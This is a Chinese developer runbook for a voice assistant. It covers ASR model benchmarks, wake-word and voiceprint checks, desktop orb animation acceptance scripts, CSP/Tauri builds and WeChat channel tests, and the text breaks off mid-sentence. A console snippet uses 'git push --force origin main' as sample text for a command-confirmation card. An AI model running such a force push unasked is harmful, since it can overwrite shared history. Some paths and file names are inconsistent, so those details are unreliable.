原来的 `zh-14M-2023-02-23` 在本机四段真人录音上字错误率 **21.4%**，其中一句「检查目前运行状态是否正常」被听成「起床先生信息的三个情况」—— 转写错到那个程度，后面的意图判定、派发、回答全都在回答一个没人问过的问题。官方文档不公布 CER/WER（只给 RTF 和文件大小），所以三个候选在同一批录音上实测（人工参考文本，编辑距离按字算）：

| 模型 | 平均 CER | RTF | 那句长句 |
|---|---|---|---|
| `zh-14M-2023-02-23` | 21.4% | 0.014 | 18.8% |
| **`multi-zh-hans-2023-12-12`** | **14.1%** | **0.061** | **6.2%（完全正确）** |
| `zh-int8-2025-06-30` | 16.1% | 0.095 | 6.2% |

选中间那个：比 2025 版**又准又快**。RTF 0.061 是实时的 16 倍速，常驻吃得下。剩下的错误几乎全在「沃」这个字上（听成「我/窝/吴」），不影响可用性 —— 唤醒靠 KWS 不靠 ASR。

```powershell
curl.exe -C - -L -o models/asr-multi-zh-hans.tar.bz2 `
  https://github.com/k2-fsa/sherpa-onnx/releases/download/asr-models/sherpa-onnx-streaming-zipformer-multi-zh-hans-2023-12-12.tar.bz2
tar -xjf models/asr.tar.bz2 -C models
```

下载后用 provider 自检，看返回值而不是「没报错」：

```powershell
.\\.venv\Scripts\python.exe -c "from core.audio import SherpaStreamingAsrProvider; print(SherpaStreamingAsrProvider('models/sherpa-onnx-streaming-zipformer-zh-14M-2023-02-23').load())"
```

## 唤醒唤不醒（先做这一步，别先调参数）

适用时机：对着麦克风喊唤醒词没有反应。**先分层，再动手** —— 「喊了没反应」有五个完全不同的
根因，而它们在使用者眼里长得一模一样。

第一步看控制台「运行态」的唤醒漏斗（四个计数 + 注册模式 + 输入电平）：

| 读数 | 说明 |
|---|---|
| 提示「注册模式」 | 一个人都没注册，唤醒判定被按住。去「声纹」页注册（注册成功即刻解开） |
| 输入峰值一直 ~0 | 设备在出零：换 `[input] device`，或看设备名是不是漂了（索引会漂） |
| 唤醒词命中 = 0，电平正常 | KWS 那一层的事 —— 跑下面那个脚本 |
| 命中 > 0、声纹拒绝 > 0 | 声纹的事：看相似度，用「试一句」对比，必要时重录 |
| 命中 > 0、接受 > 0、没进聆听 > 0 | 识别器没开起来，看 `last_listen_refusal` |

**KWS 那一层不要靠对着麦克风试。** 用真录音喂**生产那条回调路径**（VAD → 增益 → KWS），
一次跑完就能知道是词表、阈值、增益，还是麦克风：

```powershell
$env:PYTHONUTF8=1; .\.venv\Scripts\python.exe .vox-ref\wake_path_check.py
```

它要 `.vox-ref/rec/*.wav`（16 kHz、本人念唤醒词的录音；这个目录不进版本控制，因为里面是
本人语音）。期望：`你好小沃 你好小沃 你好小沃.wav` **3/3 命中**，且各档电平都是 3/3。
2026-09-01 就是这个脚本查出「自适应增益自己造削波把命中打成 1/3」的
（见 `docs/research/prototype-results.md`）。**改 `core/audio/gain.py`、`vad.py` 或唤醒词
阈值之后必须重跑它** —— 单元测试盯的是不变式，命中率只有真音频能答。

## 声纹录入

适用时机：首次录入本人声纹、追加样本提高通过率，或换麦克风后重录。**必须本人在场**。

**首选控制台**（`run_console.py --voice` → 「声纹」页）：页面按 `core/audio/enroll_prompts.py`
给出六句各不相同的长句、后两句要求退开两步，录的是**声纹门自己读的那个环形缓冲**，所以
「注册和校验同信道」是构造上成立的。一个人都没注册时那一页也能用（注册模式：设备开着、
唤醒判定被按住），注册成功即刻解开，不用重启。同一页还有「校准输入音量」——
它直接改 Windows 那一侧的输入音量并复测，别再手动去找那根滑条。

命令行是等效的备用路（同一份提示句、同一个设备、同样落 embedding）：

```powershell
.\.venv\Scripts\python.exe scripts/enroll_speaker.py --name <你的名字>
```

按提示读 6 句，脚本显示每段时长并写入 embedding。`enroll` 是**追加**语义：已有向量保留、新向量附加，所以一次录得不好可以补录，不必全部重来。

注册数据落 `enrollment/voiceprints.json`，它是**生物特征**，已在 `.gitignore` 内，**永不提交**。查看注册状态只用 `describe()`，不要直接读文件：

```powershell
.\.venv\Scripts\python.exe -c "from core.audio import SpeakerVerificationProvider; import json; p = SpeakerVerificationProvider(); p.load(); print(json.dumps(p.describe(), ensure_ascii=False, indent=2))"
```

删除某人的注册：`provider.remove("<名字>")`，返回 `True` 表示删掉了、`False` 表示本来就没有。

## 桌面前端改动

适用时机：修改 `desktop/src/`、`desktop/index.html`、Vite 配置或 Tauri 前端依赖后。

```powershell
Push-Location desktop
npm run build
Pop-Location
```

该命令同时运行 TypeScript 检查和 Vite 生产构建。启动本地页面进行手工检查时：

```powershell
Push-Location desktop
npm run dev
Pop-Location
```

Vite 应使用 `http://localhost:<port>`，不要把 `127.0.0.1` 作为视觉验证入口。

### 签名动作门禁（替代已失效的「八态十元组零重复」）

亮片数统一成 6、形状一直流动之后，静止一帧的元组不再能分辨八态（使用者选了「生命感
优先」）。回归验收改成**量一段时间的动作**：每态预热 160 帧（让弹簧与成环走完）再连量
252 帧（4 秒 = 一个心跳周期），逐帧读 canvas 像素算四个量。判据是**每一对至少有一个量
明显不同**。

在 `npm run dev` 起的 `index.html` 里跑（脚本见 git 历史里这一节的 eval，或照下面的量
自己写）。当前基线：

| 态 | 能量摆动× | 半径摆动% | 平均等效半径 | 质心行程 |
|---|---|---|---|---|
| idle | 2.27 | 16.0 | **0.019** | 0.03 |
| listening | **3.17** | 8.6 | 0.415 | 0.13 |
| thinking | 2.22 | **0.3** | **0.512** | 0.12 |
| speaking | 1.93 | 3.8 | 0.479 | 0.15 |
| cancelled | 2.32 | 8.3 | 0.279 | 0.24 |
| error | 2.98 | 4.0 | 0.371 | 0.23 |

逐对可辨的依据：`idle` 的平均半径 0.019 是唯一「几乎不存在」的（它会收回成一个点然后
隐藏窗口）· `thinking` 的半径摆动 0.3% 是唯一不胀缩的、平均半径 0.512 是全表最大（元素
全在 0.56R 的环上）· `listening` 能量摆动最高 + 轮廓真的胀缩 8.6% · `speaking` 能量摆动
最低 1.93 而平均半径 0.479（吐到中段）· `cancelled` 是活着的五态里平均半径最小的 ·
`error` 能量摆动 2.98 且质心行程最大（漏拍 + 单侧拉扣）。

**`idle` 那一行的 16% 半径摆动不是呼吸**，是收回成点的过程被量进来了 —— 这一行的判据只
看平均半径。

### 调唤醒球的大小

`desktop/size.html`（`npm run dev` 之后打开 `http://localhost:5173/size.html`）：
三个尺寸并排 × 深浅两底，滑块调「布局盒总尺寸」与「球/布局盒」两个数，页面直接给出
可照抄的两行。转场用的是与 `main.ts` **逐字相同**的弹簧与成环速率，所以这页看到的
就是真机上的。

真机上试不用重新编译前端 —— `VOX_ORB_SIZE` 由 Rust 侧拼成 `index.html?orb=N`
（范围 96–420，越界忽略）：

```bash
VOX_ORB_SIZE=240 .venv/Scripts/python.exe scripts/demo_orb.py --hold 3 --wait 6
```

### 切态的转场是弹簧，逐条可断言

`bloomSpring(to)` 给每个目标态一组 `{k, d}`，主循环按
`vel += (target−bloom)·k − vel·d; bloom += vel` 积分。**过冲由 `d` 相对 `2√k` 决定**，
所以「哪几个态允许回弹」是判据不是手感：

| 转场 | 过冲 | 到 95% | 稳定 | 判据 |
|---|---|---|---|---|
| → listening | **+7.8%** | 6 帧 | 14 帧 | 允许过冲（醒过来有劲） |
| → speaking | **+7.0%** | 7 帧 | 15 帧 | 允许过冲（开口有劲） |
| → error | 0 | 13 帧 | 16 帧 | **禁止过冲**，最快 |
| → cancelled | 0 | 15 帧 | 19 帧 | **禁止过冲**（垮掉不许回弹） |
| → thinking | 0 | 20 帧 | 25 帧 | 禁止过冲（戏在成环） |
| → idle | 0 | 45 帧 | 58 帧 | 禁止过冲，最慢（呼气） |

成环 0.10/帧、收回 **0.15/帧**（收回之后紧接着要出声）。改这几个数之后重跑上表：
`npx vite-node` 直接调 `bloomSpring` 模拟即可，不需要渲染。

### 改了花冠（`desktop/src/core.ts`）还要做五件事

零、**先把验收面打开，改一步看一步。** `desktop/review.html`（2026-08-30 新建）：

```bash
cd desktop && npm run dev -- --port 5273 --strictPort
```

然后开 **`http://localhost:5273/`** —— 根路径直接落在验收页上。重写是 `vite.config.ts` 里
一个 dev-only 中间件做的，**只在 5273 生效**：Tauri 的 `devUrl` 是 5173，所以
`npm run tauri dev` 装进那个 140px 透明窗口的仍然是生产页 `index.html`。

五带：**活的 360px × 深浅两底**（状态转化、弹簧过冲、成环与收回、每片各自的呼吸、
质心晃动、液面涟漪全在这里）· **活的 140px × 深浅两底**（真实尺寸，与上面同帧同步）·
**静止八格 × 深底** · **静止八格 × 浅底**（点任意一格，活的那两带跳到该态）· 面板与确认卡。
顶部控制条给实时读数：当前态、`bloom` 当前→目标、`ring` 当前→目标、这一态的弹簧
`k`/`d` 与它允不允许过冲。

**它的插值不抄式子，直接 `import { bloomSpring, ringRate }`。** `preview.html` 的「活的
一带」抄了一份 `*0.12` / `*0.07` 并声称「与 main.ts 逐字相同」—— 而主循环早就换成每态
自己的弹簧了，那两个常数已经过期。**抄下来的常数会过期，import 进来的不会。**

`core.ts` / `style.css` 一改，这一页整页刷新（`import.meta.hot.accept` 里
`location.reload()`）。**先在这一页上看，再去跑下面四件** —— 下面每一件只回答一个标量，
而「读起来对不对」只有这一页能回答。这条顺序是 2026-08-30 定的：那一轮我拿标量当判据
改了三轮片体质感，而问题（读作塑料糖豆）在 360px 渲染上一眼就能看出来。

一、几何指纹要看，而且**十个量都要看**。在 `npm run dev` 起的页面里：

```javascript
for (const s of ['idle','listening','thinking','speaking','cancelled','error']) {
  window.setVoiceState(s, 0.85);
  console.log(s, window.render_core_to_text());
}
window.setVoiceState('thinking', 0.35); window.setLanes(2);
window.showConfirm('git push --force origin main', 'shell.run');
console.log('gated', window.render_core_to_text());
window.hideConfirm();
```

`{bloom, petals, ring, spin, skew, breath, rate, blobs, hot, wobble}` 必须**两两不同**，
而且每一对至少有一个**视觉可读**的量不同 —— 要逐对检查，不能只看元组整体不等。
当前实测值（八态、零重复）见 `D:\program\docs\design\AI_STATES.md` 第 1.1 节。

二、**动效包络要量**，这是「够不够活」唯一不靠吵架的判据。跑满一个呼吸周期、
逐帧读 canvas 像素，量亮度总和与亮度加权等效半径：

```javascript
(() => {
  const cv = document.querySelector('#core'), ctx = cv.getContext('2d'), R = cv.width/2;
  const out = {};
  for (const [st, amp, rate] of [['idle',0.35,0.85],['listening',0.85,1.57],['speaking',0.8,2.9]]) {
    window.setVoiceState(st, amp);
    // **必须预热。** 不预热的话 bloom 正从上一态爬过来(bloom += (target-bloom)*0.12,
    // 约 400ms),ring 也在爬(0.07/帧,约 700ms)——那段过渡会被算成「呼吸摆动」,
    // 数字虚高一倍以上。此前记的 4.23×/5.78× 就是这么来的。
    for (let j = 0; j < 140; j++) window.step(16);
    const steps = Math.round((2*Math.PI/rate)/0.016), E = [], RR = [];
    for (let k = 0; k < steps; k++) {
      window.step(16);
      if (k % 4) continue;
      const d = ctx.getImageData(0,0,cv.width,cv.height).data;
      let sum = 0, wr = 0;
      for (let y = 0; y < cv.height; y += 2) for (let x = 0; x < cv.width; x += 2) {
        const i = (y*cv.width+x)*4, a = d[i+3]/255;
        if (a < 0.02) continue;
        const L = (0.2126*d[i]+0.7152*d[i+1]+0.0722*d[i+2])*a;
        if (L < 6) continue;
        sum += L; wr += L*Math.hypot(x-R, y-R);
      }
      if (sum > 0) { E.push(sum); RR.push(wr/sum/R); }
    }
    const rMin = Math.min(...RR), rMax = Math.max(...RR);
    out[st] = { energy_ratio: +(Math.max(...E)/Math.min(...E)).toFixed(2),
                eqR_swing_pct: +(((rMax-rMin)/2/((rMin+rMax)/2))*100).toFixed(1) };
  }
  return out;
})()
```

当前**稳态**基线（**2026-08-30 复测**）：idle **2.14×** / ±3.4%、listening **3.05×** / ±7.0%、
speaking **1.75×** / ±3.2%、thinking **2.30×** / ±0.5%、**六态全程 31.16×**。

> **这一节的判据已经被本文档前面的「签名动作门禁」取代，两处并存但采样方式不同。**
> 那一节（亮片数统一成 6 之后新建的那套）预热 **160** 帧、连量 **252** 帧（固定 4 秒），
> 记的是 idle 2.27 / listening 3.17 / thinking 2.22 / speaking **1.93** / cancelled 2.32 /
> error 2.98；这一节预热 **140** 帧、跑一个 `2π/rate` 周期。两套的 speaking 差 9%
> （1.93 vs 1.75），idle / listening / thinking 差 3–6% —— **同一件事的两把尺子，谁也
> 没错，但不该拿一把的数字去判另一把的门。** 以「签名动作门禁」那一节为准。
>
> 这一节此前记的 idle 2.48 / listening 2.21 / speaking **3.26** / thinking 1.45 与两把尺子
> 都不符（speaking 差了快一倍），已用复测值替换。2026-08-30 用
> `git show HEAD:desktop/src/core.ts` 取出未改动版逐项对照过：**HEAD 上就是 1.75×**，
> 不是那一轮改动造成的。

**改动前后要各跑一次，只看差值。** 绝对值受基线漂移与采样方式影响，差值不受。
2026-08-30 那一轮（`corolla()` 成环相 + `body()`）实测差值：idle −1.9%、listening −1.3%、
speaking −0.6%、thinking −1.3%、六态 −8.2% —— 全部是轻微下降，方向一致（片体软化与
暗层增强都会略微垫高低谷），没有一项跨过判据边界。
**单态的等效半径摆动已经不是判据**：0.72R 那条软边带（这一代唯一承担边界的层）
是固定半径的，它必然按住亮度加权半径。保真度改看逐帧对照的 `eqR` 平均绝对差
（当前 **0.042**，判据 ≤0.05）与 `energy_shape`（当前 **0.147**，判据 ≤0.16）。
**能量摆动掉回 1.1× 量级就是退回「一张贴图」**，那正是使用者两次判断都指出的问题。
判据是**每个呼吸态稳态 ≥1.8×**；保真度不看单态摆动，看逐帧对照的能量形状（≤0.16）——
素材整轮的 3.8× 是一段固定编排的跨度，与「单态一次呼吸」不是同一个量。
最聚合的那一态天然最不起伏：0.83 一段所有项都已经开着，没有会切换的项。
`thinking` 的 1.61× 是刻意的：它的 `breathAmp` 只有 0.06，而且它合拢成一叠统一亮片，
靠**转**而不是靠胀缩表达「在忙」。

**两个已经踩过的坑，改这四个函数之前先读：**

- **补偿要咬 `bloomLevel()`（态的目标值），不能咬 `bloomAt()`（含呼吸的当帧值）。**
  单片 alpha 的过曝反向补偿一旦键在当帧值上，呼吸让 bloom 涨时 alpha 同步跌，
  一涨一跌相消 —— 实测 listening 从 4.5× 崩到 **1.33×**，球退回一张贴图。
- **任何固定半径的亮环都会把等效半径按住。** 体积光（DD-026）和 0.90R 的流动带
  （DD-028）各犯过一次。带子不能挪就让它的**权重**随呼吸收放（alpha 改 `k^2.2`），
  实测 ±6.6% → ±8.9%。**看起来像取舍的东西，先问它是不是键错了量。**

三、**逐帧对照要跑满 270 帧**（`replay.html`）。它把素材逐帧提取出来的聚合度与三个簇色
逐帧喂进渲染器，再用**与提取器逐行相同**的代码读回七项度量。判据（去掉素材前 15 帧的
淡入相，252 帧）：

| 度量 | **2026-08-30 实测**（HEAD / 改动后） | 原记的「当前」 | 原判据 |
|---|---|---|---|
| 等效半径 平均绝对差 | **0.0604 / 0.0606** | 0.044 | 0.055 ⚠️ **已超** |
| 归一化能量形状 平均绝对差 | 0.1638 / 0.1639 | 0.150 | 0.20 ✅ |
| 核亮度比 平均绝对差 | 0.1878 / 0.1877 | 0.157 | 0.22 ✅ |
| 横向梯度占比 平均绝对差 | 0.0941 / 0.0942 | 0.108 | 0.16 ✅ |
| 加权 RGB 质心 平均距离 | **154.7 / 154.4** | 80 | 110 ⚠️ **已超** |

> **等效半径与加权质心两条已经超过判据，而且不是 2026-08-30 那一轮改的** —— 同一天用
> `git show HEAD:desktop/src/core.ts` 取出未改动版跑同一页对照，HEAD 是 0.0604 / 154.7，
> 改动后 0.0606 / 154.4，**六项差值全部 ≤0.5%**。质心那一条在 AI_STATES 1.4 里其实已经
> 记着「80 → 125 退步」了 —— 125 本身就超过判据 110，也就是说这份文件里的判据和那份
> 文件里的当前值当时就已经互相矛盾，只是没人把两页放在一起看。
>
> **这一轮不改判据数字。** 把一条红着的门改成绿的需要先知道它为什么红（哪一轮、改了
> 什么），而那要 `git bisect`。现在做的只有一件：把实测值记下来，并标明它是红的。
> 与「动效包络」那一节不同 —— 那一节是**两把尺子并存**，这一节只有一把，所以这两条
> 是真的红，不是量错了。

**逐帧对照页做过一处修正**（同日）：`replay.html` 此前把 `--glass`/`--edge` 从 CSS 读进来
喂给渲染器，而**素材是黑底视频，它没有「透明置顶窗口自带的那层暗」**（那一层的存在
理由是浅色桌面上球不能消失，见 DD-034）。现在置零。实测这一项影响 <1%（带这一层
eqR 0.0601 / 质心 153.1，置零后 0.0606 / 154.4），置零留着是为了将来 —— 那一层只要
继续变强，早晚会污染这条对照。

```powershell
# 前置：素材帧解出来放 .vox-ref/（gitignore），再把 timeline.json 复制进 desktop/
node .vox-ref/timeline.mjs                       # 270 帧 → .vox-ref/timeline.json
Copy-Item .vox-ref/timeline.json desktop/vox-timeline.json
# 浏览器打开 http://localhost:5173/replay.html ，读 window.__REPLAY__.result
```

**新增任何「贴合度」标量，必须同时给并排渲染**（`side.html`，12 格：上排素材、
下排复刻、同尺寸同裁切）。这条规则来自一次真实的错：脊线含量靠给花瓣描一道白边就能
对上素材，而并排渲染出来是一圈白色线框，读作矢量花瓣（见 AI_STATES 第 1.4 节）。

三点五、**片体质感要在 360px 上看，并量四个数**（`desktop/texture.html`，2026-08-30 新建）。
148px 的对照页看不出片体是「一团光」还是「一块贴纸」—— 那个区别在 8 像素宽的东西上
根本渲染不出来。这一页把单态放大到 360px（深浅两底各一格），并用**与提取器逐行相同**
的代码量四项：

```powershell
# 需要 dev server（本 worktree 用 5273，主仓库用 5173）
& "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" `
  --headless=new --disable-gpu --hide-scrollbars `
  --user-data-dir="$env:TEMP\vox-tex" `
  --window-size=810,1720 --virtual-time-budget=8000 `
  --screenshot="$PWD\.vox-texture.png" `
  "http://localhost:5273/texture.html"
# 数字读 DOM 里的 <pre>：--dump-dom 之后 grep "cross .* ridge .* 边缘硬度 .* 核亮度比"
```

| 量 | 含义 | thinking 当前 | 素材 |
|---|---|---|---|
| `ridge` 脊线含量 | 负拉普拉斯 ÷ 亮度和。片体有可描出的边时它高 | **0.0147**（改前 0.0309） | 0.076 |
| **边缘硬度** | 梯度模长 p95 ÷ 峰值亮度。这一项是 2026-08-30 新加的 | **0.0763**（改前 0.1280） | —— |
| `cross` 横向梯度占比 | **在成环相不是有效判据**：它主要由片体轮廓边缘贡献，软化边缘必然降它（0.4162 → 0.3361，而视觉明显变好） | 0.3361 | 散开相 0.44–0.54 |
| 核亮度比 | r<0.12 均值 ÷ 峰值。`thinking` 必须接近 0 —— 「中心让空」是这一相与「一朵有花心的花」的唯一区别 | **0.1289** | 成环相 0.33–0.39 |

**这一页存在的理由是一次误判**：成环相的片体在 148px 上看不出问题，在 360px 上读作
**塑料糖豆**（DD-035）。而且它抓到了一个回归：片体外晕等比放大会往球心方向扩，六片的
晕在中心叠起来 ⇒ `thinking` 的中心不再是暗的。核亮度比那一列就是为了钉住这一条。

四、七格对照页要在**深浅两种桌面底 × 两档 DPR** 上看：

```powershell
& "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" `
  --headless=new --disable-gpu --hide-scrollbars `
  --user-data-dir="$env:TEMPox-edge-shot" `
  --window-size=1240,940 --virtual-time-budget=5000 `
  --screenshot="$PWD\.vox-breath-final.png" `
  "http://localhost:5173/preview.html"

# 2× DPR
& "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" `
  --headless=new --disable-gpu --hide-scrollbars `
  --user-data-dir="$env:TEMPox-edge-2x" `
  --window-size=640,700 --force-device-scale-factor=2 --virtual-time-budget=5000 `
  --screenshot="$PWD\.vox-breath-2x.png" `
  "http://localhost:5173/preview.html"
```

`preview.html` 从 CSS 读颜色、用 `CorollaBreath` 画图，和生产同一条链路，所以它不会
在配色上撒谎。三格 = 深色桌面（六态 + 闸门）· 浅色桌面（同上）· 面板与确认卡。
加 `?anim` 看动效。截图落在 `.vox-*.png`（已在 `.gitignore` 内）。

四、反模式检测器要跑，而且要确认它没有降级：

```bash
IMPECCABLE_NO_TELEMETRY=1 node ~/.claude/skills/impeccable/scripts/detect.mjs src index.html preview.html
```

零输出 = 零命中。输出里若带 `DEGRADED - HTML parser modules unavailable`，
结论是**漏报而不是干净**，先把 `htmlparser2` / `css-select` / `css-tree` / `domutils` 装回去。

## Tauri/Rust 改动

适用时机：修改 `desktop/src-tauri/`、窗口属性、透明度、always-on-top、skip-taskbar 或系统 API 后。

```powershell
Push-Location desktop/src-tauri
cargo check
cargo test        # 命中区几何、JS 字符串转义、信封反序列化与托盘解析 20 项
Pop-Location
```

打包前再运行：

```powershell
Push-Location desktop
npm run tauri build
Pop-Location
```

透明窗口、DPI、多显示器和不抢焦点行为不能只靠 `cargo check` 判定，必须在 Windows 实机启动后验收。

P8 唤醒球的具体验收项（都是 REAL-WIN 级）：
- 命中区之外鼠标**穿过**窗口，球与展开面板能吃鼠标；
- 无边框窗口没有跟随球的方形灰影（`shadow(false)` 生效）；
- 按住球拖 4px 以上窗口跟手，松手后不误触点击；键盘激活（`detail=0`）的点击不受拖动标志影响；
- 展开时窗口向下长、不越出工作区下边界；球在正常展开时**不跳动**；
- `VOX_WAKE_VISIBLE` 未设时窗口隐藏、`vox_set_visible(true)` 后可见；
- 125% / 150% / 175% 缩放下命中区与光标不漂移。

### 改了 CSP、或改了前端里任何一次 `fetch`（必做，dev server 测不出来）

`tauri.conf.json` 的 `app.security.csp` **只在打包后生效**，dev server 一个字节都不发。
所以「在 5173/5273 上看着好」对 CSP 相关的失败没有任何证明力 —— 2026-09-03 的
「打包后的球一直不是 AE 序列层」就是这么藏了两天（`connect-src` 少了 `'self'`，取雪碧图
元数据的 `fetch` 被拒，而加载失败是**静默回退手写渲染器**的）。

```powershell
Push-Location desktop; npm run build; Pop-Location
.\.venv\Scripts\python.exe scripts/acceptance/csp_check.py      # 策略从 tauri.conf.json 读
```

判据：**控制台零 CSP 报错**，且脚本退出时四条资产（`orb/flow.json`、`orb/burst.json`、
`orb/flow.png`、`orb/burst.png`）全部 `OK`。任何一条缺就意味着打包后那一层不工作，
而它不会报错给使用者。`--relaxed` 是对照组（不发 CSP，等价于 dev server 那一侧）。

改完要进二进制还得重新链接，而**运行中的 `vox.exe` 会把链接挡住**（`os error 5 拒绝访问`）。
先退出托盘，或者把它改个名再构建（Windows 允许重命名运行中的 exe，进程跟着 inode 走）：

```powershell
Move-Item desktop/src-tauri/target/release/vox.exe desktop/src-tauri/target/release/vox.exe.inuse
Push-Location desktop/src-tauri; cargo build --release; Pop-Location
```

验证等级说明：`cargo check`/`cargo test` 只算 AUTO；命中表在 `docs/research/prototype-results.md` 里是 SIM；真机手感是 P10（发布阻塞项 #5）。

## 真机验收：说话（REAL-MIC + REAL-AGENT，**这一步没有替代品**）

适用时机：发布前、换麦克风后、改过唤醒/声纹/ASR/延迟相关的任何一层之后。**必须本人在场**。

```powershell
$env:PYTHONUTF8=1; .\.venv\Scripts\python.exe scripts/acceptance/real_mic_e2e.py --rounds 5
```

每轮：先说「你好小沃」，听到应答音之后说一句话（比如「现在几点」），说完等它回答。
脚本自己在生产装配上插了六个时刻，最后打一张表：

| 列 | 含义 |
|---|---|
| KWS→声纹 | 关键词命中到声纹判定完（3 秒环形缓冲比对） |
| 声纹→转写 | 接受到 ASR 端点触发（含你说请求的时间 + rule2 的 1.2 s） |
| 转写→首chunk | 派发 + agent 首个增量（`task.progress` 的 `first_chunk_ms`） |
| 首chunk→第一声 | TTS 合成到第一块音频出声 |
| **唤醒→第一声** | **目标指标** |

汇总里还有：KWS 命中率、声纹接受/拒绝次数与相似度、增益读数、唤醒漏斗四层计数。

**先确认麦克风不是聋的。** 这台机器上蓝牙耳机断开时，就绪清单里的 `input` 会说
「没匹配到任何可用的输入设备……改用系统默认设备」，而那只内建阵列实测峰值 0.00003 ——
那种情况下 KWS 一次都不会命中，而每一层都报告自己健康。插上耳机再跑。

为什么没有自动化替代：试过「扬声器放真录音、麦克风收」，三个原因都量到了 ——
蓝牙耳机不能同时收放（播放一开始采集流收到 112 块全零）、能用的输入设备在两次枚举之间会变、
以及无蓝牙的那条路空气通了但 KWS 不命中。**一只笔记本扬声器播放的人声录音不是一个在说话
的人**，所以那条路只能证明装置本身可用，不能替真人签字。详见
`docs/research/prototype-results.md`。

### 连续对话与「退下吧」（REAL-MIC，跟着上面那一轮一起做）

改过 `wake.follow_up`、`capture.resume_listening`、`VoiceRuntime._dismiss` 或
`is_dismissal` 的说法清单之后：

| 说 | 期望 |
|---|---|
| 「你好小沃」→「现在几点」→ 等它答完 | 球**不收**，日志有「接着听下一句（8 秒内没人说话就收）」 |
| 接着直接说「讲个笑话」（**不喊唤醒词**） | 照常起一轮；`shell.run` 仍可用（已验证身份被保留） |
| 再接着说「退下吧」 | 回一句「好，随时叫我」→ 球**立刻**收 → 状态回待机；日志 `route=dismiss`，**没有** `task.*` 事件 |
| 什么都不说，等 8 秒 | 日志「这一轮聊完了：8 秒内没听到说话，退回待机」，之后按 `orb.hide_after_s` 收球 |
| 说「帮我结束这个进程」 | **照常派发**（这是反向护栏，不是结束对话） |

代码级的对应断言在 `tests/test_runtime.py` 的「连续对话」与「结束本次对话」两节
（`pytest tests/test_runtime.py tests/test_intent.py -q`）。真机要验的只有一件事：
**说完之后不用再喊唤醒词，而说「退下吧」之后它真的不再听**。

## 系统托盘验收（REAL-WIN，代码级已过）

适用时机：修改 `build_tray`、`TrayItems`、`{"kind":"tray"}` / `{"kind":"control"}` 两个形状，
或 `VoiceRuntime` 的 `wake_manually` / `pause_wake` / `open_settings` 后。

代码级：

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_runtime.py tests/test_capture_listening.py -q
```

七项菜单，逐项在实机上点一遍（**这一步没有替代品**，Rust 的托盘 API 没有可注入的假实现）：

| 菜单项 | 期望 | 出错时的样子 |
|---|---|---|
| 状态：… | 跟着状态机变（待机/聆听中/思考中/正在回复/需要处理），不可点 | 文字不动 = `{"kind":"tray"}` 没到 Rust；能点 = `enabled` 传错 |
| 主动唤醒 | 球立刻出现并进「聆听中」，**不问唤醒词** | 球出来但不进聆听 → 看运行日志里 `listen_refused` 那一条 |
| 暂停唤醒 / 恢复唤醒 | 文字随点击互换；暂停期间喊唤醒词无反应，麦克风**不关**（就绪清单里峰值照常动） | 峰值也停了 = 有人把设备关掉了，那条路的「恢复」会失败 |
| 显示 / 隐藏 | 球显隐；隐藏时若挂着确认卡，Python 侧按拒绝落定 | 隐藏后确认卡还在等 = fail-closed 被破坏 |
| 动画：开 / 关 | 关掉后球静止在一帧代表帧（半径/形变/瓣数仍能分辨状态） | 系统开了「减少动态效果」时应当**始终静止**，此项开不回来 |
| 设置… | 打开控制台（带 token 的那个 URL） | 打不开 → `settings_url` 没注入，日志里有一条 warn |
| 退出 | 进程结束，托盘图标消失 | 图标残留 = 没走 `app.exit(0)` |

**主动唤醒必须验的那一条：它不给身份。** 点完菜单直接说一句要跑命令的话（例如「运行 git status」），
应当落在「需要确认」或被拒，**不能**因为「已验证」而直接执行 —— 那一刻没有音频可比对，
`begin_listening()` 把说话人清成 `None` 就是为了这个。

## 微信通道验收（REAL-WEIXIN，代码级已过）

适用时机：改 `core/channels/` 之后，或者第一次把微信接上。

代码级（AUTO，不打网络）：

```powershell
python -m pytest tests/test_channels.py tests/test_channel_crypto.py tests/test_weixin_login.py tests/test_channel_control.py -q
```

期望 **72 passed**（channels 34 + crypto 15 + login 17 + control 6）。

控制台那一侧另有十几条，**`-k weixin` 抓不全**（`-k` 匹配的是测试名，而那几条里只有几个名字
带 weixin，其余叫 `..._renders_the_qr_...` / `..._unbinding_...` / `..._cursor_...`）：

```powershell
python -m pytest tests/test_console.py -q -k "weixin or qr or unbind or cursor or channel or scan or panel"
```

期望 **15 passed**。其中最该看的三条：「token 的值不出现在返回给页面的任何地方」（这一页会被
截图）、「游标只返回新条目」（重复给会让同一条消息在界面上出现好几遍）、以及
「`--no-weixin` 在写配置之前就拒」（顺序反过来会让一次失败的操作留下一半的副作用）。

真机那一步按顺序做，**每一步都有它自己会失败的方式**：

1. **绑定。** 控制台「微信」栏 → 「扫码登录」→ 手机微信扫 → 微信里点确认。
   - 页面一直停在「请用手机微信扫码」而手机说已确认 → 看 `scaned_but_redirect` 有没有生效
     （凭据里的 `base_url` 应该变成了另一个域名）。
   - 二维码框空白 → 缺 `segno`：`.venv\Scripts\python.exe -m pip install segno`。
2. **通道自己就开了**（2026-09-04 起）。页面上应该出现「绑定成功 —— 通道已经在收消息了」，
   状态那一行变成「正在收消息」，启动/运行日志里有
   `weixin: 在听（凭据来自扫码，语音回复 开，本机转写 开，出站语音走 文件附件）`。
   - **写着「绑定成功，但通道没自动打开」** → 后面跟着原因。带 `--no-weixin` 启动是最常见的
     一个；去掉那个参数重启，凭据已经存好了。
   - 之后要开关就点那一栏的「打开通道 / 关闭通道」，**立即生效**，同时写进
     `config/channels.toml` 的 `enabled`（下次启动还记得）。手改那一行仍然有效，只是要重启。
   - **状态写着「配置是开的但通道没起来」** → 这一格只在启动那一刻起不来时出现，
     点一次「打开通道」看它报什么。
3. **文字往返。** 从另一个微信号给它发一句「现在几点」。控制台「微信」栏的实时收发里
   应该出现一条 `in` 和一条 `out`。
   - 有 `in` 没有 `out` → 看运行日志里 `weixin` 那一源，多半是 `context_token` 没回带
     （出站必须回带该 peer 最新的那个）。
4. **语音进。** 发一条**语音消息**。日志里 `source` 应该是 `local`（本机 ASR 转的）。
   - `source=provider` 说明用的是腾讯自带的转写 —— 那是退路，通常意味着原始音频是 SILK
     而我们解不了（日志里会说「SILK 我们解不了」）。这不是缺陷，是已知边界。
5. **语音出。** 回复应该同时有文字和一个能播的音频附件。
   - **原生语音气泡未验证**：Hermes 上游自己都没跑通（`send_voice` 的注释写着
     `not proven-working`），所以默认走文件附件。想试原生就把 `voice_native = true`，
